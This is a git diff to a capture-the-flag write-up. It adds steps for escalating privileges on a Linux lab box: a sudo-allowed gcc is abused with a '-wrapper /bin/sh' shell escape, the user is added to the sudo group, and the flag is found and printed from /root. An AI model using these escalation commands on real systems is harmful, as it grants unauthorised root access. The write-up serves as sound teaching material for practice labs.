@@ -93,14 +93,44 @@ sudo -l
 
 Doopdeedoop:
 
+```bash
+gcc -wrapper /bin/sh,-s .
+sudo usermod -aG sudo Pentester
+exit
+exit
+# to log out the pentester. log back in
+```
 
 
+```bash
+ssh -p 2222 Pentester@<ip>
+```
+
+```bash
+groups
+Pentester sudo
+```
+
+See what command we can run
+```bash
+sudo -l
+(ALL) NOPASSWD: /usr/bin/gcc
+```
+
+Run that again. 
 
 ---
 
 ### Step 3: Flag Retrieval
 
 Now we have root, the flag's gotta be here somewhere, normally just use find (looking for flag.txt) or grep (looking for FLAG within a file) on the entire file system. 
+
+```bash
+find / -name flag.txt -type f
+/root/flag.txt
+cat /root/flag.txt
+FLAG{7H15_SUDO_C00K3D_R007}
+```
 
 
 ![image](https://github.com/user-attachments/assets/08fef0f2-78d4-4051-baac-8a8a62515e4a)
@@ -111,7 +141,8 @@ Now we have root, the flag's gotta be here somewhere, normally just use find (lo
 ## Notes
 
 - Don't be afraid to ask for help when you get blocked. Difficult for you can be easy for someone else and vice versa. 
-- As a team, set up some tools in comms (like threads in channels) to share progress on challenges. 
+- As a team, set up some tools in comms (like threads in channels) to share progress on challenges.
+- Linpeas and gftobins are l337h4x0r
 
 ---
 
